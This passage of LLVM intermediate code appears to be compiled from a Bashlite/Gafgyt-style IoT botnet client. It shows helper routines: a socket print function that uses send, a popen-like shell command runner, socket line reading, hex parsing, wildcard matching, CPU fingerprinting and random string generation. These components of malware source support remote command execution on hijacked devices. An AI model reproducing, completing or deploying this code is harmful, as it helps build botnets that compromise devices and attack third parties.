  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %62

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %60

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, 65280
  %59 = ashr i32 %58, 8
  br label %60

; <label>:60:                                     ; preds = %53, %52
  %61 = phi i32 [ -1, %52 ], [ %59, %53 ]
  store i32 %61, i32* %2, align 4
  br label %62

; <label>:62:                                     ; preds = %60, %19
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %43

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #10
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #10
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

; <label>:52:                                     ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* %54) #10
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

; <label>:61:                                     ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

; <label>:63:                                     ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #10
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43

; <label>:69:                                     ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* %70, i32 46) #10
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

; <label>:73:                                     ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* %74, i32 46) #10
  store i8 0, i8* %75, align 1
  br label %76

; <label>:76:                                     ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* %77, i8* %78) #2
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %2, align 4
  br label %87

; <label>:82:                                     ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:84:                                     ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 %85)
  store i32 1, i32* %2, align 4
  br label %87

; <label>:87:                                     ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:21:                                     ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
